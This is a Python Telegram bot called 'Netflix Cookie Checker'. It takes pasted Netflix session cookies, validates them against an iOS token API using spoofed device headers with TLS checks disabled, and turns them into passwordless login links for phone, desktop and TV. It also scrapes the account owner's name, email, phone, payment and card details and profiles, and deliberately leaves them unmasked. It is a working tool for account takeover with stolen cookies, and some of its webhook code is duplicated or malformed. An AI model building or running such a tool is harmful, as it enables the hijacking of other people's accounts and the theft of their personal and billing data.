import os
import asyncio
import logging
import re
from typing import Dict, Optional, Tuple

import requests
import html
from telegram import Update
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes,
)

BOT_TOKEN = os.environ.get("BOT_TOKEN")
PORT = int(os.environ.get("PORT", 8000))
WEBHOOK_URL = os.environ.get("WEBHOOK_URL")  # e.g., https://your-app.onrender.com

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger(__name__)


START_TEXT = (
    "👋 Netflix Cookie Checker Bot\n\n"
    "Paste your Netflix cookies here (the bot will NOT store or log them).\n\n"
    "Accepted formats:\n"
    "• Full `Cookie:` header line\n"
    "• Or values like: NetflixId=...; SecureNetflixId=...; OptanonConsent=...\n\n"
    "Send cookies now:"
)

HELP_TEXT = (
    "How it works:\n"
    "• Use /start then paste cookies.\n"
    "• Bot validates cookies using Netflix api.\n"
    "• If valid, bot converts it into a session login link ( phone | pc | tv )"
)


COOKIE_NAME_RE = re.compile(r"(?i)\b(netflixid|securenetflixid|netflixcookies|__secure-netflixcookies)\b")
COOKIE_KV_RE = re.compile(r"^\s*([A-Za-z0-9_\\-]+)\s*=\s*(.+?)\s*$", re.DOTALL)


def _looks_like_cookie_header(text: str) -> bool:
    t = text.strip().lower()
    return t.startswith("cookie:") or ";" in text


def _extract_cookie_kv_pairs(text: str) -> Dict[str, str]:
    """
    Accept either:
      - full Cookie: a=b; c=d
      - values-only lines like NetflixId=...; SecureNetflixId=...
    """
    # Remove leading "Cookie:" if present
    cleaned = re.sub(r"(?i)^\s*cookie\s*:\s*", "", text).strip()

    # Split by ';' first (Cookie header style)
    parts = [p.strip() for p in cleaned.split(";") if p.strip()]
    if len(parts) == 1 and "\n" in cleaned:
        parts = [p.strip() for p in cleaned.splitlines() if p.strip()]

    kv: Dict[str, str] = {}
    for part in parts:
        m = COOKIE_KV_RE.match(part)
        if m:
            k = m.group(1).strip()
            v = m.group(2).strip()
            kv[k] = v
            continue

        # If part doesn't match key=value, ignore it.
    return kv


def _build_cookie_header(cookie_input: str) -> Optional[str]:
    # If user pasted full Cookie: header line, keep it (after stripping "Cookie:")
    if _looks_like_cookie_header(cookie_input):
        cleaned = re.sub(r"(?i)^\s*cookie\s*:\s*", "", cookie_input).strip()
        # Basic sanity: require at least one '='
        if "=" not in cleaned:
            return None
        return cleaned

    # Otherwise treat as values-only: attempt parse key=value pairs
    kv = _extract_cookie_kv_pairs(cookie_input)
    if not kv:
        return None
    # Rebuild into Cookie header format
    return "; ".join([f"{k}={v}" for k, v in kv.items()])


def _safe_preview_cookie_keys(cookie_header: str) -> str:
    # Never log values; only list cookie names.
    names = []
    for token in cookie_header.split(";"):
        token = token.strip()
        if "=" in token:
            k = token.split("=", 1)[0].strip()
            names.append(k)
    names = [n for n in names if n]
    return ", ".join(names[:8]) + ("…" if len(names) > 8 else "")


NFTOKEN_API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
NFTOKEN_QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "maxDeviceWidth": "375",
    "model": "saget",
    "modelType": "IPHONE8-1",
    "odpAware": "true",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "pixelDensity": "2.0",
    "progressive": "false",
    "responseFormat": "json",
}

NFTOKEN_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.context.ab-tests": "",
    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "accept-language": "en-US;q=1",
    "x-netflix.argo.abtests": "",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.request.client.context": '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor": "argo",
    "x-netflix.argo.nfnsm": "9",
    "x-netflix.context.pixel-density": "2.0",
    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.request.client.timezoneid": "Asia/Dhaka",
}


def _extract_netflix_id_from_cookie_header(cookie_header: str) -> Optional[str]:
    for token in cookie_header.split(";"):
        token = token.strip()
        if not token or "=" not in token:
            continue
        k, v = token.split("=", 1)
        if k.strip().lower() == "netflixid":
            return v.strip()
    return None


def _generate_nftoken(cookie_header: str, timeout_s: int = 20) -> Tuple[bool, str, Optional[str]]:
    """
    Mirrors NetflixBot.py: call FTL token API using NetflixId cookie.
    Returns: (ok, detail, nftoken)
    """
    netflix_id = _extract_netflix_id_from_cookie_header(cookie_header)
    if not netflix_id:
        return False, "Invalid or expired cookie.", None

    headers = dict(NFTOKEN_HEADERS)
    headers["Cookie"] = f"NetflixId={netflix_id}"

    try:
        r = requests.get(
            NFTOKEN_API_URL,
            params=NFTOKEN_QUERY_PARAMS,
            headers=headers,
            timeout=timeout_s,
            verify=False,
        )
        r.raise_for_status()
        data = r.json()

        # Mirror NetflixBot.py extraction exactly
        td = ((((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default") or {})
        nftoken = td.get("token")

        if not nftoken:
            return False, "Invalid or expired cookie.", None

        return True, "Token API returned a valid nftoken.", nftoken
    except Exception:
        return False, "Invalid or expired cookie.", None


EMAIL_RE = re.compile(r'([A-Za-z0-9._%+-]{2})[A-Za-z0-9._%+-]*(@[A-Za-z0-9.-]+\.[A-Za-z]{2,})')
PHONE_RE = re.compile(r'(\+?\d{2})\d{2,}(\d{2})')


def _scrub_email(m: re.Match) -> str:
    # keep first 2 chars + domain tail, remove middle
    g1 = m.group(1)
    g2 = m.group(2)
    return f"{g1}***{g2}"


def _scrub_phone(m: re.Match) -> str:
    return f"{m.group(1)}******{m.group(2)}"


def _scrub_text(text: str) -> str:
    # No masking: return raw values.
    if not text:
        return "Unknown"
    return str(text)


def _check_netflix_cookie(cookie_header: str, timeout_s: int = 25) -> Dict[str, str]:
    """
    Best-effort account info extraction copied/adapted from NetflixBot.py check_netflix_cookie.
    Returns dict with keys (ok/premium/name/country/plan/email/member_since/plan_price/...).
    """
    # Turn Cookie header into a dict for Session.cookies.update()
    cookie_dict: Dict[str, str] = {}
    for token in cookie_header.split(";"):
        token = token.strip()
        if not token or "=" not in token:
            continue
        k, v = token.split("=", 1)
        cookie_dict[k.strip()] = v.strip()

    if not cookie_dict.get("NetflixId"):
        return {"ok": False, "reason": "No NetflixId"}

    session = requests.Session()
    session.cookies.update(cookie_dict)

    headers = {
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/124.0.0.0 Safari/537.36"
        ),
        "Accept": "text/html,application/xhtml+xml",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate",
    }

    urls = [
        "https://www.netflix.com/YourAccount",
        "https://www.netflix.com/account",
        "https://www.netflix.com/account/membership",
    ]

    try:
        resp = None
        txt = ""
        for url in urls:
            try:
                r = session.get(url, headers=headers, timeout=timeout_s, allow_redirects=True, verify=False)
                if r.status_code == 200 and "Account" in (r.text or ""):
                    resp = r
                    txt = r.text or ""
                    break
            except Exception:
                continue

        if not resp or resp.status_code != 200:
            return {"ok": False, "reason": f"HTTP {resp.status_code if resp else 'error'}"}

        if ("login" in (resp.url or "").lower()) or ("signin" in (resp.url or "").lower()):
            return {"ok": False, "reason": "Redirected to login"}

        def find(pattern: str) -> Optional[str]:
            m = re.search(pattern, txt)
            return _scrub_text(m.group(1)) if m else None

        name = find(r'"accountOwnerName"\s*:\s*"([^"]+)"') or find(r'"firstName"\s*:\s*"([^"]+)"')
        plan_raw = find(r'localizedPlanName.{1,50}?value":"([^"]+)"') or find(r'"planName"\s*:\s*"([^"]+)"')
        plan = plan_raw or None
        country = (
            find(r'"countryOfSignup"\s*:\s*"([^"]+)"')
            or find(r'"countryCode"\s*:\s*"([^"]+)"')
            or find(r'"currentCountry"\s*:\s*"([^"]+)"')
        )
        email = (
            find(r'"emailAddress"\s*:\s*"([^"]+)"')
            or find(r'"email"\s*:\s*"([^"]+)"')
            or find(r'"loginId"\s*:\s*"([^"]+)"')
        )
        member_since = find(r'"memberSince":"([^"]+)"')
        next_billing = (
            find(r'"nextBillingDate":\{[^}]*"date":"([^T"]+)"')
            or find(r'"nextBilling"[^}]*"value":"([^"]+)"')
        )
        plan_price = (
            find(r'"planPrice":\{"fieldType":"String","value":"([^"]+)"')
            or find(r'"formattedPlanPrice"\s*:\s*"([^"]+)"')
        )
        payment = (
            find(r'"paymentMethod":\{"fieldType":"String","value":"([^"]+)"')
            or find(r'"paymentMethodType"\s*:\s*"([^"]+)"')
        )
        card = (
            find(r'"paymentCardDisplayString"\s*:\s*"([^"]+)"')
            or find(r'"displayText"\s*:\s*"([^"]+)"')
        )
        phone = (
            find(r'"phoneNumberDigits":\{[^}]*"value":"([^"]+)"')
            or find(r'"phoneNumber"\s*:\s*"([^"]+)"')
        )
        phone_ver = "Yes" if re.search(r'"isVerified":true', txt) else "No" if re.search(r'"isVerified":false', txt) else None
        quality = (
            find(r'"videoQuality":\{"fieldType":"String","value":"([^"]+)"')
            or find(r'"maxVideoQuality"\s*:\s*"([^"]+)"')
        )
        streams = (
            find(r'"maxStreams":\{"fieldType":"Numeric","value":([0-9]+)')
            or find(r'"maxStreams"\s*:\s*"?([0-9]+)"?')
        )
        hold = "Yes" if re.search(r'"isUserOnHold":true', txt) else "No" if re.search(r'"isUserOnHold":false', txt) else None
        extra = "Yes" if re.search(r'"showExtraMemberSection":\{"fieldType":"Boolean","value":true', txt) else "No" if re.search(r'"showExtraMemberSection"', txt) else None
        email_ver = "Yes" if re.search(r'"emailVerified"\s*:\s*true', txt) else "No" if re.search(r'"emailVerified"\s*:\s*false', txt) else None
        guid = find(r'"userGuid":\s*"([^"]+)"') or find(r'"ownerGuid":\s*"([^"]+)"')

        status_match = re.search(r'"membershipStatus":\s*"([^"]+)"', txt)
        ms = status_match.group(1) if status_match else None

        is_prem = ms == "CURRENT_MEMBER" if ms else bool(plan and "free" not in str(plan).lower())
        has_account = ("Account" in txt)  # sanity
        if not (has_account):
            return {"ok": False, "reason": "No account data found"}

        profiles: list[str] = []
        try:
            rp = session.get("https://www.netflix.com/ManageProfiles", timeout=15, verify=False)
            if rp.status_code == 200:
                profiles = re.findall(r'"profileName"\s*:\s*"([^"]+)"', rp.text or "")
                if not profiles:
                    profiles = re.findall(r'"displayName"\s*:\s*"([^"]+)"', rp.text or "")
                if not profiles:
                    profiles = re.findall(r'"name"\s*:\s*"([^"]+)"', rp.text or "")
        except Exception:
            pass

        profiles_str = ", ".join([_scrub_text(p) for p in profiles]) if profiles else None

        return {
            "ok": True,
            "premium": str(is_prem),
            "name": name or "Unknown",
            "country": country or "Unknown",
            "plan": plan or "Unknown",
            "plan_price": plan_price or "Unknown",
            "member_since": member_since or "Unknown",
            "next_billing": next_billing or "Unknown",
            "payment_method": payment or "Unknown",
            "masked_card": card or "Unknown",
            "phone": phone or "Unknown",
            "phone_verified": phone_ver or "Unknown",
            "video_quality": quality or "Unknown",
            "max_streams": streams or "Unknown",
            "on_payment_hold": hold or "Unknown",
            "extra_member": extra or "Unknown",
            "email_verified": email_ver or "Unknown",
            "email": email or "Unknown",
            "profiles": profiles_str or "Unknown",
            "user_guid": guid or "Unknown",
            "membership_status": ms or "Unknown",
        }
    except Exception as e:
        return {"ok": False, "reason": str(e)}


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(START_TEXT, parse_mode="Markdown")


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(HELP_TEXT)


async def handle_cookie_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message:
        return

    cookie_input = (update.message.text or "").strip()
    if not cookie_input:
        await update.message.reply_text("Please paste your cookies.")
        return

    cookie_header = _build_cookie_header(cookie_input)
    if not cookie_header:
        await update.message.reply_text(
            "❌ Could not parse cookies.\n\n"
            "Paste either:\n"
            "• Full `Cookie:` header line, or\n"
            "• Key=Value pairs (NetflixId=..., SecureNetflixId=..., ...)"
            "\n\nThen send again."
        )
        return

    # Show progress
    preview = _safe_preview_cookie_keys(cookie_header)
    msg = await update.message.reply_text(
        f"🔎 Checking Netflix cookies...\n"
        f"(Detected cookie names: {preview})"
    )

    # Run blocking HTTP in a thread
    loop = asyncio.get_running_loop()
    ok, detail, nftoken = await loop.run_in_executor(None, _generate_nftoken, cookie_header)

    if ok and nftoken:
        # also fetch account details using technique from NetflixBot.py
        acct = await loop.run_in_executor(None, _check_netflix_cookie, cookie_header)

        # Exact URLs that work in NetflixBot.py
        phone_link = f"https://www.netflix.com/unsupported?nftoken={nftoken}"
        desktop_link = f"https://www.netflix.com/browse?nftoken={nftoken}"
        tv_link = f"https://www.netflix.com/tv8?nftoken={nftoken}"

        phone_html = f'<a href="{phone_link}">Open link</a>'
        desktop_html = f'<a href="{desktop_link}">Open link</a>'
        tv_html = f'<a href="{tv_link}">Open link</a>'

        # If parsing fails, still show links
        acct_ok = bool(acct and acct.get("ok") is True)
        status_line = f"Verification: {detail}\n"

        acct_text = ""
        if acct_ok:
            acct_text = (
                "\n\nAccount details:\n"
                f"• Name: {acct.get('name','Unknown')}\n"
                f"• Plan: {acct.get('plan','Unknown')} ({acct.get('plan_price','Unknown')})\n"
                f"• profiles: {acct.get('profiles','Unknown')}\n"
                f"• Country: {acct.get('country','Unknown')}\n"
                f"• Email: {acct.get('email','Unknown')}\n"
                f"• Member since: {acct.get('member_since','Unknown')}\n"
                f"• Next billing: {acct.get('next_billing','Unknown')}\n"
                f"• On payment hold: {acct.get('on_payment_hold','Unknown')}\n"
                f"• Payment: {acct.get('payment_method','Unknown')} / {acct.get('masked_card','Unknown')}\n"
                f"• max streams: {acct.get('max_streams','Unknown')}\n"
                f"• phone: {acct.get('phone','Unknown')} (verified: {acct.get('phone_verified','Unknown')})\n"
                f"• plan quality: {acct.get('video_quality','Unknown')}\n"
            )

        detail_html = html.escape(str(detail))
        status_html = html.escape(status_line)

        acct_html = ""
        if acct_ok:
            acct_html = (
                "<b>Account details</b>:\n"
                f"• Name: {html.escape(str(acct.get('name','Unknown')))}\n"
                f"• Plan: {html.escape(str(acct.get('plan','Unknown')))} ({html.escape(str(acct.get('plan_price','Unknown')))})\n"
                f"• profiles: {html.escape(str(acct.get('profiles','Unknown')))}\n"
                f"• Country: {html.escape(str(acct.get('country','Unknown')))}\n"
                f"• Email: {html.escape(str(acct.get('email','Unknown')))}\n"
                f"• Member since: {html.escape(str(acct.get('member_since','Unknown')))}\n"
                f"• Next billing: {html.escape(str(acct.get('next_billing','Unknown')))}\n"
                f"• On payment hold: {html.escape(str(acct.get('on_payment_hold','Unknown')))}\n"
                f"• Payment: {html.escape(str(acct.get('payment_method','Unknown')))} / {html.escape(str(acct.get('masked_card','Unknown')))}\n"
                f"• max streams: {html.escape(str(acct.get('max_streams','Unknown')))}\n"
                f"• phone: {html.escape(str(acct.get('phone','Unknown')))} (verified: {html.escape(str(acct.get('phone_verified','Unknown')))})\n"
                f"• plan quality: {html.escape(str(acct.get('video_quality','Unknown')))}\n"
            )

        await msg.edit_text(
            "✅ Valid cookie detected.\n\n"
            "Session login links:\n"
            f"📱 Phone: {phone_html}\n"
            f"🖥️ Desktop: {desktop_html}\n"
            f"📺 TV: {tv_html}\n"
            f"\n{status_html}"
            f"{acct_html}",
            parse_mode="HTML",
            disable_web_page_preview=True,
        )
    else:
        await msg.edit_text("❌ Invalid or expired cookie.")


async def main():
    """Start the bot with webhook support for Render."""
    if not BOT_TOKEN:
        logger.error("❌ BOT_TOKEN not set!")
        return

    if not WEBHOOK_URL:
        logger.error("❌ WEBHOOK_URL not set!")
        return

    app = ApplicationBuilder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_cookie_text))

    logger.info("🤖 Netflix Cookie Checker Bot is starting (webhook mode)...")

    # Use webhook instead of polling
    await app.bot.set_webhook(url=WEBHOOK_URL, drop_pending_updates=True)

    async with app:
        await app.start()
        logger.info(f"✅ Bot started with webhook: {WEBHOOK_URL}")

        try:
            # Keep the app running
            await asyncio.Event().wait()
        except KeyboardInterrupt:
            logger.info("🛑 Shutting down...")
        finally:
            await app.stop()


def run_flask_app():
    """Flask app to receive webhook updates."""
    from flask import Flask, request
    from telegram import Update

    flask_app = Flask(__name__)

    @flask_app.route("/", methods=["GET"])
    def index():
        return "✅ Netflix Cookie Checker Bot is running!", 200

    @flask_app.route(f"/webhook/{BOT_TOKEN}", methods=["POST"])
    async def webhook(request_data):
        try:
            update = Update.de_json(request_data.get_json(force=True), application.bot)
            await application.process_update(update)
        except Exception as e:
            logger.error(f"Error processing update: {e}")
        return "ok", 200

    return flask_app


# Global app instance for Flask webhook handler
application = None


async def setup_and_run():
    """Initialize the bot application and run Flask server."""
    global application

    if not BOT_TOKEN:
        logger.error("❌ BOT_TOKEN not set!")
        return

    if not WEBHOOK_URL:
        logger.error("❌ WEBHOOK_URL not set!")
        return

    application = ApplicationBuilder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_cookie_text))

    async with application:
        await application.start()
        logger.info(f"✅ Bot initialized with webhook: {WEBHOOK_URL}")
        await application.bot.set_webhook(url=WEBHOOK_URL, drop_pending_updates=True)


if __name__ == "__main__":
    import sys

    # Check if we should use Flask webhook mode
    use_webhook = WEBHOOK_URL is not None

    if use_webhook:
        # Flask + async setup
        from flask import Flask, request
        import threading

        flask_app = Flask(__name__)

        @flask_app.route("/", methods=["GET"])
        def index():
            return "✅ Netflix Cookie Checker Bot is running!", 200

        @flask_app.route(f"/webhook/{BOT_TOKEN}", methods=["POST"])
        def webhook():
            try:
                update_data = request.get_json(force=True)
                update = Update.de_json(update_data, application.bot)
                # Schedule the coroutine in the event loop
                asyncio.create_task(application.process_update(update))
            except Exception as e:
                logger.error(f"Error processing update: {e}")
            return "ok", 200

        # Initialize bot in a separate thread
        def init_bot():
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop.run_until_complete(setup_and_run())

        init_thread = threading.Thread(target=init_bot, daemon=True)
        init_thread.start()

        # Run Flask server
        logger.info(f"🚀 Starting Flask server on port {PORT}")
        flask_app.run(host="0.0.0.0", port=PORT, debug=False)
    else:
        # Polling mode (for local development)
        logger.info("🔄 Starting bot in polling mode...")
        asyncio.run(main())
